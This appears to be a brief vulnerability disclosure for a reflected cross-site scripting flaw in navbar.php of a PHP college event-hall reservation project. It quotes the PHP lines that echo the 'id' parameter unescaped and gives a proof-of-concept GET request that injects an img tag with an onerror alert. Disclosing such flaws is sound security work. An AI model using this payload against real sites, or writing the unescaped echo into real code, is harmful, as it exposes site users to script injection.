# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS navbar.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /navbar.php

## Code
```php
 <li><a class="nav-link scrollto" href="index.php?id=<?php echo $id; ?>">Home</a></li>
                    <li><a class="nav-link scrollto" href="rooms.php?id=<?php echo $id; ?>">Rooms</a></li>
                    <li><a class="nav-link scrollto" href="users.php?id=<?php echo $id; ?>">Users</a></li>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/navbar.php?id=%22%3E%3Cimg%20src=x%20onerror=alert(%22NoChizPlz%22)%3E HTTP/1.1
Host: [REDACTED]
```

## Screenshot
